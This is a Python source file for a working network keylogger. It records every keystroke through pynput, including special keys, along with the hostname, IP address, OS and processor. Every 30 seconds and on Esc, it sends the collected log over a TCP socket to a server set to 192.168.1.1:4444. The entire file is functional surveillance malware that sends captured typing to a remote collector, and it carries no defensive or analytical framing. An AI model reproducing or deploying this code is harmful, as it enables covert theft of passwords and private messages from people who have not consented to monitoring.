import os
import platform
import socket
from pynput import keyboard
from threading import Timer

# --- Network Configuration ---
SERVER_IP = "192.168.1.1"   
SERVER_PORT = 4444

# --- Logging Configuration ---
REPORT_INTERVAL = 30 # seconds (how often to send the log)

class NetworkLogger:
    def __init__(self, time_interval, ip, port):
        self.interval = time_interval
        self.ip = ip
        self.port = port
        self.log = "Network KeyLogger Started...\n"
        self.append_system_info()
        self.report()
    def append_log(self, string):
        """Appends new data to the internal log variable."""
        self.log += string

    def save_data(self, key):
        """Processes and saves captured keystrokes with cleaner output."""
        
        if key == keyboard.Key.esc:
            if len(self.log) > 0:
                self.send_log_over_network(self.log)
            
            self.append_log("\n[KEYLOGGER STOPPED BY ESC KEY]\n")
            return False 
        
        try:
            current_key = str(key.char)
            
        except AttributeError:
            # Handle special keys for clean output
            if key == keyboard.Key.space:
                current_key = " "
            elif key == keyboard.Key.enter:
                current_key = "\n[ENTER]\n"
            elif key == keyboard.Key.backspace:
                current_key = " [BACKSPACE] "
            elif key == keyboard.Key.tab:
                current_key = " [TAB] "
            elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                current_key = " [SHIFT] "
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                current_key = " [CTRL] "
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                current_key = " [ALT] "
            elif key == keyboard.Key.esc:
                current_key = " [ESC] "
            else:
                key_name = str(key).split('.')[-1].upper()
                current_key = f" [{key_name}] "

        self.append_log(current_key)

    def append_system_info(self):
        """Collects and appends system details to the log."""
        self.append_log("-" * 30 + "\n")
        self.append_log(f"Hostname: {socket.gethostname()}\n")
        self.append_log(f"IP Address: {socket.gethostbyname(socket.gethostname())}\n")
        self.append_log(f"System: {platform.system()} ({platform.machine()})\n")
        self.append_log(f"Processor: {platform.processor()}\n")
        self.append_log("-" * 30 + "\n")

    def send_log_over_network(self, data):
        """Connects to the server and sends the log data."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.ip, self.port))
            s.sendall(data.encode('utf-8'))
            s.close()
        except Exception as e:
            self.append_log(f"\n[NETWORK ERROR: Failed to send report: {e}]\n")

    def report(self):
        """Sends the accumulated log data and clears the internal log."""
        if len(self.log) > 0:
            self.send_log_over_network(self.log)
            self.log = ""
        
        # Schedule the next report
        timer = Timer(self.interval, self.report)
        timer.start()

    def run(self):
        """Starts the keylogger listener and reporting timer."""
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        
        with keyboard_listener:
            # The report timer is already started in __init__
            keyboard_listener.join()
            
if __name__ == "__main__":
    logger = NetworkLogger(REPORT_INTERVAL, SERVER_IP, SERVER_PORT)
    logger.run()